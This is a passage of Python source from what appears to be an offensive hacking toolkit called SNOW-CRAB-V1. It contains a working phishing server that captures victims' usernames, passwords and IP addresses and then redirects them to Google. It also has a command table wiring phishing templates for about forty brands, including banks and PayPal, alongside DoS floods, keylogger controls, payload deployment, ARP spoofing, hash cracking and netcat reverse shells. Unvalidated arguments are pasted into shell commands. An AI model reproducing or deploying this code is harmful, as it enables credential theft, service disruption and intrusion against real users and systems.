            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        """Get active traffic generators"""
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    """HTTP request handler for phishing server"""
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        """Handle GET requests"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        
        if self.server_instance and self.server_instance.html_content:
            self.wfile.write(self.server_instance.html_content.encode())
        
        if self.server_instance and self.server_instance.db and self.server_instance.link_id:
            self.server_instance.db.increment_phishing_clicks(self.server_instance.link_id)
    
    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        form_data = urllib.parse.parse_qs(post_data)
        
        username = form_data.get('email', form_data.get('username', ['']))[0]
        password = form_data.get('password', [''])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if self.server_instance and self.server_instance.db and username and password:
            self.server_instance.db.save_captured_credential(
                self.server_instance.link_id, username, password, client_ip, user_agent
            )
            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
            print(f"  IP: {client_ip}")
            print(f"  Username: {username}")
            print(f"  Password: {password}")
        
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

class PhishingServer:
    """Phishing server for social engineering"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        """Start the phishing server"""
        try:
            self.link_id = link_id
            self.html_content = html_content
            
            handler = PhishingRequestHandler
            handler.server_instance = self
            
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Failed to start phishing server: {e}")
            return False
    
    def stop(self):
        """Stop the phishing server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        """Get the phishing server URL"""
        return f"http://{self._get_local_ip()}:8080"
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

class SocialEngineeringTools:
    """Social engineering tools"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load phishing templates from database"""
        templates = {}
        try:
            rows = self.db.get_phishing_templates()
            for row in rows:
                templates[row['name']] = row['html_content']
        except:
            pass
        return templates
    
    def reload_templates(self):
        """Reload templates from database"""
        self.templates = self._load_templates()
    
    def generate_phishing_link(self, platform: str) -> Dict:
        """Generate a phishing link for the specified platform"""
        link_id = str(uuid.uuid4())[:8]
        
        html = self.templates.get(platform, self.templates.get('custom', ''))
        if not html:
            return {'success': False, 'output': f'Template {platform} not found'}
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server for a specific link"""
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_server(self):
        """Stop phishing server"""
        self.phishing_server.stop()
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def get_available_templates(self) -> List[str]:
        """Get list of available phishing templates"""
        return list(self.templates.keys())
    
    def update_template(self, name: str, html_content: str) -> bool:
        """Update a phishing template"""
        try:
            self.db.save_phishing_template(name, 'custom', html_content)
            self.templates[name] = html_content
            return True
        except:
            return False
    
    def create_custom_template(self, name: str, html_content: str) -> bool:
        """Create a custom phishing template"""
        return self.update_template(name, html_content)
    
    def delete_template(self, name: str) -> bool:
        """Delete a phishing template"""
        try:
            self.db.delete_phishing_template(name)
            if name in self.templates:
                del self.templates[name]
            return True
        except:
            return False

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Main command handler for SNOW-CRAB-V1"""
    
    def __init__(self, db: DatabaseManager, ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None, 
                 dos_engine = None, 
                 network_monitor = None,
                 keylogger = None, 
                 deployment_engine = None,
                 domain_hosting = None,
                 cracking_engine = None,
                 arp_spoofing = None,
                 mac_manager = None,
                 nat_info = None,
                 platform_executor = None,
                 email_composer = None,
                 pdf_report = None,
                 docker_scanner = None,
                 shodan_engine = None,
                 social_tools = None):
        self.db = db
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.dos = dos_engine
        self.network_monitor = network_monitor
        self.keylogger = keylogger
        self.deployment = deployment_engine
        self.domain_hosting = domain_hosting
        self.cracking = cracking_engine
        self.arp_spoofing = arp_spoofing
        self.mac_manager = mac_manager
        self.nat_info = nat_info
        self.platform_executor = platform_executor
        self.email_composer = email_composer
        self.pdf_report = pdf_report
        self.docker_scanner = docker_scanner
        self.shodan = shodan_engine
        self.social = social_tools or SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        """Build the command dictionary"""
        return {
            # PING COMMANDS
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            'ping_flood': self._ping_flood,
            'ping_continuous': self._ping_continuous,
            'ping_timestamp': self._ping_timestamp,
            'ping_size': self._ping_size,
            'ping_ttl': self._ping_ttl,
            'ping_interval': self._ping_interval,
            'ping_count': self._ping_count,
            
            # NMAP COMMANDS
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_scan': self._nmap_scan,
            'nmap_ping': self._nmap_ping,
            'nmap_tcp': self._nmap_tcp,
            'nmap_syn': self._nmap_syn,
            'nmap_ack': self._nmap_ack,
            'nmap_window': self._nmap_window,
            'nmap_fin': self._nmap_fin,
            'nmap_xmas': self._nmap_xmas,
            'nmap_null': self._nmap_null,
            'nmap_script': self._nmap_script,
            'nmap_aggressive': self._nmap_aggressive,
            'nmap_intense': self._nmap_intense,
            'nmap_traceroute': self._nmap_traceroute,
            'nmap_ports': self._nmap_ports,
            'nmap_exclude': self._nmap_exclude,
            'nmap_randomize': self._nmap_randomize,
            'nmap_spoof': self._nmap_spoof,
            'nmap_decoy': self._nmap_decoy,
            'nmap_fragment': self._nmap_fragment,
            'nmap_mtu': self._nmap_mtu,
            'nmap_scan_delay': self._nmap_scan_delay,
            'nmap_max_retries': self._nmap_max_retries,
            'nmap_host_timeout': self._nmap_host_timeout,
            
            # TRACEROUTE COMMANDS
            'traceroute': self._traceroute,
            'tracert': self._traceroute,
            'tracepath': self._tracepath,
            'mtr': self._mtr,
            'mtr_report': self._mtr_report,
            'mtr_json': self._mtr_json,
            'traceroute_tcp': self._traceroute_tcp,
            'traceroute_udp': self._traceroute_udp,
            'traceroute_icmp': self._traceroute_icmp,
            'traceroute_port': self._traceroute_port,
            'traceroute_max_hops': self._traceroute_max_hops,
            'traceroute_timeout': self._traceroute_timeout,
            'traceroute_queries': self._traceroute_queries,
            'traceroute_numeric': self._traceroute_numeric,
            'traceroute_as': self._traceroute_as,
            
            # WGET COMMANDS
            'wget': self._wget,
            'wget_file': self._wget_file,
            'wget_recursive': self._wget_recursive,
            'wget_mirror': self._wget_mirror,
            'wget_continue': self._wget_continue,
            'wget_limit_rate': self._wget_limit_rate,
            'wget_quota': self._wget_quota,
            'wget_headers': self._wget_headers,
            'wget_user_agent': self._wget_user_agent,
            'wget_cookies': self._wget_cookies,
            'wget_auth': self._wget_auth,
            'wget_proxy': self._wget_proxy,
            'wget_https_only': self._wget_https_only,
            'wget_spider': self._wget_spider,
            'wget_timestamping': self._wget_timestamping,
            'wget_background': self._wget_background,
            'wget_log': self._wget_log,
            'wget_timeout': self._wget_timeout,
            'wget_tries': self._wget_tries,
            'wget_wait': self._wget_wait,
            
            # CURL COMMANDS
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_put': self._curl_put,
            'curl_delete': self._curl_delete,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            'curl_patch': self._curl_patch,
            'curl_headers': self._curl_headers,
            'curl_user_agent': self._curl_user_agent,
            'curl_cookies': self._curl_cookies,
            'curl_auth': self._curl_auth,
            'curl_proxy': self._curl_proxy,
            'curl_follow': self._curl_follow,
            'curl_insecure': self._curl_insecure,
            'curl_verbose': self._curl_verbose,
            'curl_output': self._curl_output,
            'curl_json': self._curl_json,
            'curl_form': self._curl_form,
            'curl_upload': self._curl_upload,
            'curl_download': self._curl_download,
            'curl_resolve': self._curl_resolve,
            'curl_connect_timeout': self._curl_connect_timeout,
            'curl_max_time': self._curl_max_time,
            'curl_retry': self._curl_retry,
            
            # NETCAT COMMANDS
            'nc': self._netcat,
            'netcat': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            'nc_transfer': self._nc_transfer,
            'nc_shell': self._nc_shell,
            'nc_reverse': self._nc_reverse,
            'nc_banner': self._nc_banner,
            'nc_udp': self._nc_udp,
            'nc_verbose': self._nc_verbose,
            'nc_wait': self._nc_wait,
            'nc_timeout': self._nc_timeout,
            'nc_source_port': self._nc_source_port,
            
            # SSH COMMANDS
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            'ssh_delete': self._ssh_delete,
            'ssh_keygen': self._ssh_keygen,
            'ssh_copy_id': self._ssh_copy_id,
            'ssh_tunnel': self._ssh_tunnel,
            'ssh_socks': self._ssh_socks,
            'ssh_scp': self._ssh_scp,
            'ssh_sftp': self._ssh_sftp,
            
            # SHODAN COMMANDS
            'shodan_search': self._shodan_search,
            'shodan_host': self._shodan_host,
            'shodan_dns': self._shodan_dns,
            'shodan_myip': self._shodan_myip,
            'shodan_scan': self._shodan_scan,
            
            # TRAFFIC GENERATION COMMANDS
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            'traffic_icmp': self._traffic_icmp,
            'traffic_tcp': self._traffic_tcp,
            'traffic_udp': self._traffic_udp,
            'traffic_http': self._traffic_http,
            'traffic_dns': self._traffic_dns,
            'traffic_arp': self._traffic_arp,
            'traffic_mixed': self._traffic_mixed,
            'traffic_flood': self._traffic_flood,
            
            # DOS ATTACK COMMANDS
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            'dos_slowloris': self._dos_slowloris,
            'dos_syn_flood': self._dos_syn_flood,
            'dos_udp_flood': self._dos_udp_flood,
            'dos_http_flood': self._dos_http_flood,
            'dos_icmp_flood': self._dos_icmp_flood,
            
            # PHISHING COMMANDS
            'phish_facebook': lambda _: self._phish('facebook'),
            'phish_instagram': lambda _: self._phish('instagram'),
            'phish_twitter': lambda _: self._phish('twitter'),
            'phish_gmail': lambda _: self._phish('gmail'),
            'phish_linkedin': lambda _: self._phish('linkedin'),
            'phish_microsoft': lambda _: self._phish('microsoft'),
            'phish_google': lambda _: self._phish('google'),
            'phish_apple': lambda _: self._phish('apple'),
            'phish_paypal': lambda _: self._phish('paypal'),
            'phish_amazon': lambda _: self._phish('amazon'),
            'phish_netflix': lambda _: self._phish('netflix'),
            'phish_spotify': lambda _: self._phish('spotify'),
            'phish_whatsapp': lambda _: self._phish('whatsapp'),
            'phish_telegram': lambda _: self._phish('telegram'),
            'phish_discord': lambda _: self._phish('discord'),
            'phish_github': lambda _: self._phish('github'),
            'phish_slack': lambda _: self._phish('slack'),
            'phish_zoom': lambda _: self._phish('zoom'),
            'phish_teams': lambda _: self._phish('teams'),
            'phish_dropbox': lambda _: self._phish('dropbox'),
            'phish_adobe': lambda _: self._phish('adobe'),
            'phish_steam': lambda _: self._phish('steam'),
            'phish_roblox': lambda _: self._phish('roblox'),
            'phish_twitch': lambda _: self._phish('twitch'),
            'phish_xbox': lambda _: self._phish('xbox'),
            'phish_playstation': lambda _: self._phish('playstation'),
            'phish_cashapp': lambda _: self._phish('cashapp'),
            'phish_venmo': lambda _: self._phish('venmo'),
            'phish_chase': lambda _: self._phish('chase'),
            'phish_wellsfargo': lambda _: self._phish('wellsfargo'),
            'phish_office365': lambda _: self._phish('office365'),
            'phish_onedrive': lambda _: self._phish('onedrive'),
            'phish_icloud': lambda _: self._phish('icloud'),
            'phish_pinterest': lambda _: self._phish('pinterest'),
            'phish_reddit': lambda _: self._phish('reddit'),
            'phish_snapchat': lambda _: self._phish('snapchat'),
            'phish_tiktok': lambda _: self._phish('tiktok'),
            'phish_tinder': lambda _: self._phish('tinder'),
            'phish_bumble': lambda _: self._phish('bumble'),
            'phish_custom': lambda _: self._phish('custom'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'list_templates': self._list_templates,
            'view_template': self._view_template,
            'edit_template': self._edit_template,
            'create_template': self._create_template,
            'delete_template': self._delete_template,
            
            # KEYLOGGER COMMANDS
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # DEPLOYMENT COMMANDS
            'deploy_pdf': self._deploy_pdf,
            'deploy_email': self._deploy_email,
            'deploy_link': self._deploy_link,
            'deploy_executable': self._deploy_executable,
            'deploy_list': self._deploy_list,
            'deploy_track': self._deploy_track,
            
            # ARP SPOOFING COMMANDS
            'arp_spoof': self._arp_spoof,
            'arp_stop': self._arp_stop,
            'arp_status': self._arp_status,
            'arp_history': self._arp_history,
            
            # MAC COMMANDS
            'mac_info': self._mac_info,
            'mac_scan': self._mac_scan,
            'mac_vendor': self._mac_vendor,
            'mac_all': self._mac_all,
            
            # NAT COMMANDS
            'nat_info': self._nat_info,
            'nat_public': self._nat_public,
            'nat_private': self._nat_private,
            'nat_history': self._nat_history,
            
            # DOMAIN HOSTING COMMANDS
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            'host_domain': self._host_domain,
            'host_website': self._host_website,
            'list_domains': self._list_domains,
            'domain_info': self._domain_info,
            
            # CRACKING COMMANDS
            'crack': self._crack,
            'crack_status': self._crack_status,
            'crack_list': self._crack_list,
            'crack_md5': lambda _: self._crack(['md5'] + _),
            'crack_sha1': lambda _: self._crack(['sha1'] + _),
            'crack_sha256': lambda _: self._crack(['sha256'] + _),
            'crack_ntlm': lambda _: self._crack(['ntlm'] + _),
            'crack_bcrypt': lambda _: self._crack(['bcrypt'] + _),
            
            # DOCKER COMMANDS
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            'docker_bench': self._docker_bench,
            
            # EMAIL COMMANDS
            'email_compose': self._email_compose,
            'email_send': self._email_send,
            'email_list': self._email_list,
            'email_delete': self._email_delete,
            
            # PDF REPORT COMMANDS
            'report_generate': self._report_generate,
            'report_list': self._report_list,
            
            # NETWORK MONITOR COMMANDS
            'netmon_start': self._netmon_start,
            'netmon_stop': self._netmon_stop,
            'netmon_status': self._netmon_status,
            'netmon_packets': self._netmon_packets,
            
            # IP MANAGEMENT COMMANDS
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # SYSTEM COMMANDS
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'report': self._report,
            'clear': self._clear,
            'help': self._help,
            
            # PLATFORM COMMANDS
            'platform_send': self._platform_send,
            'platform_status': self._platform_status,
            'platform_results': self._platform_results,
            
            # ANIMATION COMMANDS
            'anim_spinner': self._anim_spinner,
            'anim_matrix': self._anim_matrix,
            'anim_pulse': self._anim_pulse,
            'anim_wave': self._anim_wave,
            'anim_glitch': self._anim_glitch,
            'anim_snow': self._anim_snow,
            'anim_crab': self._anim_crab,
            'anim_scan': self._anim_scan,
            
            # DNS COMMANDS
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'host': self._host,
            'dns_reverse': self._dns_reverse,
            'dns_zone': self._dns_zone,
            'dns_mx': self._dns_mx,
            'dns_txt': self._dns_txt,
            'dns_ns': self._dns_ns,
            'dns_soa': self._dns_soa,
            'dns_axfr': self._dns_axfr,
            
            # WHOIS COMMANDS
            'whois': self._whois,
            'whois_ip': self._whois_ip,
            
            # LOCATION COMMANDS
            'location': self._location,
            'geolocate': self._location,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        """Execute a command"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
                logger.error(f"Command error: {e}")
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== PING COMMAND IMPLEMENTATIONS ====================
    def _ping(self, args: List[str]) -> Dict:
        """Basic ping command"""
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        """IPv6 ping command"""
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self._generic(f'ping6 -c {count} {target}')
        return result
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        """Ping sweep a network"""
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network> (e.g., 192.168.1.0/24)'}
        network = args[0]
        result = self.tools.ping_sweep(network)
        return {'success': result.success, 'output': result.output}
    
    def _fping(self, args: List[str]) -> Dict:
        """Fast ping multiple targets"""
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        targets = ' '.join(args)
        result = self._generic(f'fping {targets}')
        return result
    
    def _ping_flood(self, args: List[str]) -> Dict:
        """Ping flood command"""
        if not args:
            return {'success': False, 'output': 'Usage: ping_flood <target>'}
        target = args[0]
        result = self._generic(f'ping -f {target}')
        return result
    
    def _ping_continuous(self, args: List[str]) -> Dict:
        """Continuous ping"""
        if not args:
            return {'success': False, 'output': 'Usage: ping_continuous <target>'}
        target = args[0]
        result = self._generic(f'timeout 10 ping {target}')
        return result
    
    def _ping_timestamp(self, args: List[str]) -> Dict:
        """Ping with timestamps"""
        if not args:
            return {'success': False, 'output': 'Usage: ping_timestamp <target>'}
        target = args[0]
        result = self._generic(f'ping -D {target}')
        return result
    
    def _ping_size(self, args: List[str]) -> Dict:
        """Ping with specific packet size"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_size <target> <size>'}
        target = args[0]
        size = args[1]
        result = self._generic(f'ping -s {size} {target}')
        return result
    
    def _ping_ttl(self, args: List[str]) -> Dict:
        """Ping with specific TTL"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_ttl <target> <ttl>'}
        target = args[0]
        ttl = args[1]
        result = self._generic(f'ping -t {ttl} {target}')
        return result
    
    def _ping_interval(self, args: List[str]) -> Dict:
        """Ping with specific interval"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interval <target> <interval>'}
        target = args[0]
        interval = args[1]
        result = self._generic(f'ping -i {interval} {target}')
        return result
    
    def _ping_count(self, args: List[str]) -> Dict:
        """Ping with specific count"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_count <target> <count>'}
        target = args[0]
        count = args[1]
        result = self._generic(f'ping -c {count} {target}')
        return result
    
    # ==================== NMAP COMMAND IMPLEMENTATIONS ====================
    def _nmap(self, args: List[str]) -> Dict:
        """Run an nmap scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        additional = args[1:] if len(args) > 1 else None
        result = self.tools.nmap_scan(target, 'quick', additional_args=additional)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        """Quick nmap scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        """Full nmap scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        """OS detection scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        """Service version detection"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        """UDP scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        """Vulnerability scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, 'vulnerability')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        """Stealth SYN scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        target = args[0]
        result = self.tools.nmap_scan(target, 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_scan(self, args: List[str]) -> Dict:
        """Scan specific ports"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_scan <target> <ports>'}
        target = args[0]
        ports = args[1]
        result = self.tools.nmap_scan(target, 'quick', ports=ports)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ping(self, args: List[str]) -> Dict:
        """Ping scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        target = args[0]
        result = self._generic(f'nmap -sn {target}')
        return result
    
    def _nmap_tcp(self, args: List[str]) -> Dict:
        """TCP connect scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_tcp <target>'}
        target = args[0]
        result = self._generic(f'nmap -sT {target}')
        return result
    
    def _nmap_syn(self, args: List[str]) -> Dict:
        """SYN scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_syn <target>'}
        target = args[0]
        result = self._generic(f'nmap -sS {target}')
        return result
    
    def _nmap_ack(self, args: List[str]) -> Dict:
        """ACK scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ack <target>'}
        target = args[0]
        result = self._generic(f'nmap -sA {target}')
        return result
    
    def _nmap_window(self, args: List[str]) -> Dict:
        """Window scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_window <target>'}
        target = args[0]
        result = self._generic(f'nmap -sW {target}')
        return result
    
    def _nmap_fin(self, args: List[str]) -> Dict:
        """FIN scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fin <target>'}
        target = args[0]
        result = self._generic(f'nmap -sF {target}')
        return result
    
    def _nmap_xmas(self, args: List[str]) -> Dict:
        """XMAS scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_xmas <target>'}
        target = args[0]
        result = self._generic(f'nmap -sX {target}')
        return result
    
    def _nmap_null(self, args: List[str]) -> Dict:
        """NULL scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_null <target>'}
        target = args[0]
        result = self._generic(f'nmap -sN {target}')
        return result
    
    def _nmap_script(self, args: List[str]) -> Dict:
        """Script scan"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_script <target> <script>'}
        target = args[0]
        script = args[1]
        result = self._generic(f'nmap --script {script} {target}')
        return result
    
    def _nmap_aggressive(self, args: List[str]) -> Dict:
        """Aggressive scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_aggressive <target>'}
        target = args[0]
        result = self._generic(f'nmap -A {target}')
        return result
    
    def _nmap_intense(self, args: List[str]) -> Dict:
        """Intense scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_intense <target>'}
        target = args[0]
        result = self._generic(f'nmap -T4 -A -v {target}')
        return result
    
    def _nmap_traceroute(self, args: List[str]) -> Dict:
        """Traceroute scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_traceroute <target>'}
        target = args[0]
        result = self._generic(f'nmap --traceroute {target}')
        return result
    
    def _nmap_ports(self, args: List[str]) -> Dict:
        """Scan specific port range"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ports <target> <port_range>'}
        target = args[0]
        ports = args[1]
        result = self._generic(f'nmap -p {ports} {target}')
        return result
    
    def _nmap_exclude(self, args: List[str]) -> Dict:
        """Exclude ports"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude <target> <ports_to_exclude>'}
        target = args[0]
        exclude = args[1]
        result = self._generic(f'nmap --exclude-ports {exclude} {target}')
        return result
    
    def _nmap_randomize(self, args: List[str]) -> Dict:
        """Randomize host order"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_randomize <target>'}
        target = args[0]
        result = self._generic(f'nmap --randomize-hosts {target}')
        return result
    
    def _nmap_spoof(self, args: List[str]) -> Dict:
        """Spoof source address"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_spoof <target> <spoof_ip>'}
        target = args[0]
        spoof = args[1]
        result = self._generic(f'nmap -S {spoof} {target}')
        return result
    
    def _nmap_decoy(self, args: List[str]) -> Dict:
        """Use decoy addresses"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_decoy <target> <decoy1,decoy2,...>'}
        target = args[0]
        decoys = args[1]
        result = self._generic(f'nmap -D {decoys} {target}')
        return result
    
    def _nmap_fragment(self, args: List[str]) -> Dict:
        """Fragment packets"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fragment <target>'}
        target = args[0]
        result = self._generic(f'nmap -f {target}')
        return result
    
    def _nmap_mtu(self, args: List[str]) -> Dict:
        """Set MTU"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_mtu <target> <mtu>'}
        target = args[0]
        mtu = args[1]
        result = self._generic(f'nmap --mtu {mtu} {target}')
        return result
    
    def _nmap_scan_delay(self, args: List[str]) -> Dict:
        """Set scan delay"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_scan_delay <target> <delay>'}
        target = args[0]
        delay = args[1]
        result = self._generic(f'nmap --scan-delay {delay} {target}')
        return result
    
    def _nmap_max_retries(self, args: List[str]) -> Dict:
        """Set max retries"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_max_retries <target> <retries>'}
        target = args[0]
        retries = args[1]
        result = self._generic(f'nmap --max-retries {retries} {target}')
        return result
    
    def _nmap_host_timeout(self, args: List[str]) -> Dict:
        """Set host timeout"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_host_timeout <target> <timeout>'}
        target = args[0]
        timeout = args[1]
        result = self._generic(f'nmap --host-timeout {timeout} {target}')
        return result
    
    # ==================== TRACEROUTE COMMAND IMPLEMENTATIONS ====================
    def _traceroute(self, args: List[str]) -> Dict:
        """Basic traceroute"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        target = args[0]
        result = self.tools.traceroute(target)
        return {'success': result.success, 'output': result.output}
    
    def _tracepath(self, args: List[str]) -> Dict:
        """Tracepath command"""
        if not args:
            return {'success': False, 'output': 'Usage: tracepath <target>'}
